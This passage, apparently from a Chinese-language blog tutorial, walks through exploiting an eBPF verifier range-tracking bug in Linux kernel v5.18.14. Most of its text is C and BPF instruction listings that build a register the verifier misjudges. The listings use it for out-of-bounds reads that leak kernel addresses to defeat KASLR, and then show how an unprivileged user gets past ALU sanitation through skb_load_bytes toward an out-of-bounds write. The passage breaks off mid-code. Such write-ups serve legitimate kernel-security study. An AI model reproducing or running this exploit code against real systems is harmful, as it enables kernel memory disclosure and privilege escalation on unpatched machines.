<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xFFFFFFFE</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; scalar</span></span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),</span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_0, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>), <span class="comment">// key</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),    </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>), <span class="comment">// value</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),              <span class="comment">// flags</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">    .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(insns[<span class="number">0</span>]),</span><br><span class="line">    .insns = (<span class="type">uint64_t</span>)insns,</span><br><span class="line">    .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL v2&quot;</span>,</span><br><span class="line">    .log_level = <span class="number">2</span>,</span><br><span class="line">    .log_size = <span class="keyword">sizeof</span>(verifier_log),</span><br><span class="line">    .log_buf = (<span class="type">uint64_t</span>)verifier_log,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> progfd = bpf(BPF_PROG_LOAD, &amp;prog_attr);</span><br><span class="line"><span class="keyword">if</span> (progfd == <span class="number">-1</span>) fatal(<span class="string">&quot;[-] bpf(BPF_PROG_LOAD)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks)) </span><br><span class="line">    fatal(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(<span class="type">int</span>)))</span><br><span class="line">    fatal(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"></span><br><span class="line">write(socks[<span class="number">1</span>], <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, verifier_log);</span><br><span class="line"></span><br><span class="line">val = <span class="number">0</span>;</span><br><span class="line">map_lookup(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, val);</span><br></pre></td></tr></table></figure>

<p>如果能成功泄露地址，则如下图所示，注意 R1 中原本有个 1，所以泄露的指针值加了 1：</p>
<p><img src="/img/ebpf-12-10/1-1.png"></p>
<p>这个地址显示，它正确地包含了数组的第一个元素（泄露的数据）：</p>
<p><img src="/img/ebpf-12-10/1-4.png"></p>
<details class="note "><summary><p>调试方式</p>
</summary>
<p>待调试的进程用 getchar() 挂住，gdb 直接 <code>target remote localhost:port</code> 即可。</p>

</details>

<p>-0x110 是找到带有数据的 BPF 映射的开始。这是因为 bpf_array 结构的存在。<strong>例如最前面的 0xffffffff81c124a0 就是 bpf_map 结构中的函数表 ops（记住这个东西，后面泄露内核基址的时候可以用到）</strong>。虽然在这种情况下没有使用，但 eBPF 攻击还包括一种重写这个 ops 的方法，以提升权限。保留 BPF 映射的地址，因为它使随后的 kASLR 泄漏更容易。 如果把它变成一个函数，这样当你传递 map 的 fd（结尾处减去1）时，它就会返回地址，这样的代码就比较干净。</p>
<details class="note "><summary><p>bpf_map 结构体</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">	<span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment">	 * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span></span><br><span class="line">	u32 key_size;</span><br><span class="line">	u32 value_size;</span><br><span class="line">	u32 max_entries;</span><br><span class="line">	u64 map_extra; <span class="comment">/* any per-map-type extra fields */</span></span><br><span class="line">	u32 map_flags;</span><br><span class="line">	<span class="type">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">	<span class="type">int</span> timer_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">	u32 id;</span><br><span class="line">	<span class="type">int</span> numa_node;</span><br><span class="line">	u32 btf_key_type_id;</span><br><span class="line">	u32 btf_value_type_id;</span><br><span class="line">	u32 btf_vmlinux_value_type_id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">	<span class="type">bool</span> bypass_spec_v1;</span><br><span class="line">	<span class="type">bool</span> frozen; <span class="comment">/* write-once; write-protected by freeze_mutex */</span></span><br><span class="line">	<span class="comment">/* 14 bytes hole */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment">	 * particularly with refcounting.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">atomic64_t</span> refcnt ____cacheline_aligned;</span><br><span class="line">	<span class="type">atomic64_t</span> usercnt;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">freeze_mutex</span>;</span></span><br><span class="line">	<span class="type">atomic64_t</span> writecnt;</span><br><span class="line">	<span class="comment">/* &#x27;Ownership&#x27; of program-containing map is claimed by the first program</span></span><br><span class="line"><span class="comment">	 * that is going to use this map or by the first program which FD is</span></span><br><span class="line"><span class="comment">	 * stored in the map to make sure that all callers and callees have the</span></span><br><span class="line"><span class="comment">	 * same prog type, JITed flag and xdp_has_frags flag.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">spinlock_t</span> lock;</span><br><span class="line">		<span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span>;</span></span><br><span class="line">		<span class="type">bool</span> jited;</span><br><span class="line">		<span class="type">bool</span> xdp_has_frags;</span><br><span class="line">	&#125; owner;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</details>



<h2 id="root-测试-oob"><a href="#root-测试-oob" class="headerlink" title="root 测试 oob"></a>root 测试 oob</h2><p>正如前文提到的，ALU sanitation 的缓解机制使得不能像以前那样简单的 oob 利用。</p>
<p>事实上如果函数 <a href="https://elixir.bootlin.com/linux/v5.18.14/source/include/linux/bpf.h#L1469"><code>bpf_bypass_spec_v1</code></a> 函数返回 true，则会绕过 ALU sanitation。这个函数对 root 权限返回真，所以你仍然可以用 root 权限尝试超出范围的引用。</p>
<p><img src="/img/ebpf-12-10/1-2.png"></p>
<p>因此，让我们首先尝试用 root 权限做一个”简单的”范围外的引用。</p>
<h3 id="破坏跟踪范围以创造一个常量"><a href="#破坏跟踪范围以创造一个常量" class="headerlink" title="破坏跟踪范围以创造一个常量"></a>破坏跟踪范围以创造一个常量</h3><p>利用 verifier 错误的一个方便的方法是创建一个常数（XX！&#x3D;Y），verifier 认为是 X，但实际上是 Y。 特别是，当X&#x3D;0,Y!&#x3D;0 时，为超出范围的引用创建偏移量是很方便的，因为无论它被乘以什么，verifier 都判断它是0。</p>
<p>首先，让我们创建一个 “验证者认为是 0 但实际上是 1 的常数”。现在 R1 的 u32_min_value为1，u32_max_value 为0。相反，在R2中放一个值，其中 u32_min_value 为 0，u32_max_value 为 1（不破坏跟踪）。现在考虑 R1 和 R2 的相加，我们看到范围是 [1,0] + [0,1] &#x3D; [1,1]。具有相同最小值和最大值的寄存器在 MOV 和其他操作下被视为常数，R1 的实际值为 1，而 R2 取 0 或 1。 因此，加法的结果必须是 [1,2]。 然而，verifier 判断加法后的 R1 是一个常数 1，这就包括了 R1 的实际值是 2 的情况。然后我们可以从 R1 中减去 1，以产生所需的 “verifier 认为是 0 但实际上是 1 的常数”。</p>
<p>u32_min_value 为 0 和 u32_max_value 为 1 的 R2 可以通过结合逻辑和算术运算或在条件分支中放弃大于1的情况来创建。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> mapfd = map_create(<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span> verifier_log[<span class="number">0x10000</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> val;</span><br><span class="line">val = <span class="number">1</span>;</span><br><span class="line">map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),	<span class="comment">// reg1=*(u64 *)reg9 reg1=1?</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)  real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1)  real:1</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>), <span class="comment">// REG_2 &lt; 1 ? JMP pc+2 : EXIT</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0	 real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>), <span class="comment">// key</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),    </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>), <span class="comment">// value</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),              <span class="comment">// flags</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面的指令可以完成读出实际 r1 真正值的操作。最终 map_lookup 的时候返回 1。</p>
<p><img src="/img/ebpf-12-10/1-3.png"></p>
<h3 id="amp-map-0-后向的数据泄露"><a href="#amp-map-0-后向的数据泄露" class="headerlink" title="&amp;map[0] 后向的数据泄露"></a>&amp;map[0] 后向的数据泄露</h3><p>扩大战果，将推测为 0，实际为 1 的 R1 直接进行一个乘，便可以实现向后任意偏移的读：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">val = <span class="number">1</span>;</span><br><span class="line">map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), 	 <span class="comment">// R9 =&gt; &amp;map[0]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)  real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1)  real:1</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>), <span class="comment">// REG_2 &lt; 1 ? JMP $+2 : EXIT</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0	 real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0 actual: 0x100</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x100</span>),		<span class="comment">// !!!</span></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_9),</span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_1),	<span class="comment">// reg3 = reg1 + &amp;map[0]</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, <span class="number">0</span>),	<span class="comment">// reg2 = *(u64 *)reg3</span></span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_2, <span class="number">-0x10</span>), <span class="comment">// *(u64 *)(fp-0x10)=reg2</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>), <span class="comment">// key</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),    </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>), <span class="comment">// value</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),              <span class="comment">// flags</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> progfd = bpf(BPF_PROG_LOAD, &amp;prog_attr);</span><br><span class="line"><span class="keyword">if</span> (progfd == <span class="number">-1</span>) fatal(<span class="string">&quot;[-] bpf(BPF_PROG_LOAD)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks)) </span><br><span class="line">    fatal(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(<span class="type">int</span>)))</span><br><span class="line">    fatal(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] write.\n&quot;</span>);</span><br><span class="line">write(socks[<span class="number">1</span>], <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">map_lookup(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val = 0x%016lx\n&quot;</span>, val);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, verifier_log);</span><br><span class="line">getchar();</span><br></pre></td></tr></table></figure>

<p><img src="/img/ebpf-12-10/1-5.png"></p>
<p><img src="/img/ebpf-12-10/1-6.png"></p>
<p>可以看到有很多内核代码段地址可以用来绕过 kaslr（但是稳不稳定没有测试）。</p>
<p>请注意，当常数 0x100 作为 MOV 传递时，验证器会检测到超范围引用，表明该漏洞可以导致超范围引用。然而，如果同一程序以普通用户的权限执行，就不会有数据泄露，因为ALU sanitation 会将超出范围的引用通过加法转换为 0 的加法，如下图所示。 (从一开始就放入的值1被取出，这也表明由于ALU的卫生问题，加法是没有意义的）。</p>
<p><img src="/img/ebpf-12-10/1-7.png"></p>
<blockquote>
<p>在没有ALU sanitation 的年代，这种技术是对读&#x2F;写 bpf_map 结构 ops 等最常见的攻击。</p>
</blockquote>
<p>别忘了，此时我们是 root 权限在测试。</p>
<h2 id="普通用户绕过-ALU-sanitation"><a href="#普通用户绕过-ALU-sanitation" class="headerlink" title="普通用户绕过 ALU sanitation"></a>普通用户绕过 ALU sanitation</h2><p>幸运的是，在本文讨论的内核 v5.18.14 中，有一种方法可以绕过 ALU sanitation。 这个思路是让一个现有的辅助函数工作，因为对指针的加减法（超出范围的）会被修补。</p>
<p>普通用户可以使用的辅助函数很少，但让我们看看以偏移量和大小为参数的函数。<strong>函数 skb_load_bytes 就可以在 socket filter 中使用</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">BPF_CALL_4(bpf_skb_load_bytes, <span class="type">const</span> <span class="keyword">struct</span> sk_buff *, skb, u32, offset,</span><br><span class="line">	   <span class="type">void</span> *, to, u32, len)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(offset &gt; INT_MAX))</span><br><span class="line">		<span class="keyword">goto</span> err_clear;</span><br><span class="line"></span><br><span class="line">	ptr = skb_header_pointer(skb, offset, len, to);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!ptr))</span><br><span class="line">		<span class="keyword">goto</span> err_clear;</span><br><span class="line">	<span class="keyword">if</span> (ptr != to)</span><br><span class="line">		<span class="built_in">memcpy</span>(to, ptr, len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_clear:</span><br><span class="line">	<span class="built_in">memset</span>(to, <span class="number">0</span>, len);</span><br><span class="line">	<span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_skb_load_bytes_proto</span> =</span> &#123;</span><br><span class="line">	.func		= bpf_skb_load_bytes,</span><br><span class="line">	.gpl_only	= <span class="literal">false</span>,</span><br><span class="line">	.ret_type	= RET_INTEGER,</span><br><span class="line">	.arg1_type	= ARG_PTR_TO_CTX,</span><br><span class="line">	.arg2_type	= ARG_ANYTHING,</span><br><span class="line">	.arg3_type	= ARG_PTR_TO_UNINIT_MEM,</span><br><span class="line">	.arg4_type	= ARG_CONST_SIZE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>该函数允许将数据包的内容复制到 BPF 端（映射或堆栈）。</p>
<p>指定第一个参数为上下文，第二个参数为要复制的数据包的偏移量，第三个参数为目标缓冲区，第四个参数为要复制的大小。拷贝的源头是数据包，所以通过 write 发送至套接字的数据会被拷贝。<strong>当这个函数被调用时，它会确定参数是否超出了范围，但不受 ALU sanitation 的影响。</strong>让我们来试一试。 现在，BPF 映射的数据大小是8，所以如果你能复制超过8个字节，你就成功了! </p>
<p>创建一个寄存器，使验证器判断其为1，而实际值为0x10。用写的方式发送超过0x10字节的数据，用 gdb 检查它是否被复制到映射上。（注意，如果你传递0（或一个假定值）作为大小，verifier 将被提醒）</p>
<p>上述程序会将带有 skb_load_bytes 的数据包写入 BPF 映射的第0个元素（该元素存储在地址 R9，是第一次获得的地方）。实际上写的是0x10个字节，但 verifier 推测是1个字节，所以允许写。</p>
<p>调用程序时，发送0x10字节的数据，如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// R8 --&gt; context</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line"><span class="comment">// ···</span></span><br><span class="line"><span class="comment">// R1 --&gt; 1 / actual: 0x10		注意顺序不可以反 先加成1后，实际和真实都是0x10了</span></span><br><span class="line">BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),			 <span class="comment">// arg2=offset  (0)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_9),  <span class="comment">// arg3=to      (&amp;map[0])</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),  <span class="comment">// arg4=len     (0x10)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),  <span class="comment">// arg1=skb</span></span><br><span class="line">BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"><span class="comment">// ----------------------------------------------------------------</span></span><br><span class="line"><span class="type">char</span> payload[<span class="number">0x10</span>];</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">0</span>] = <span 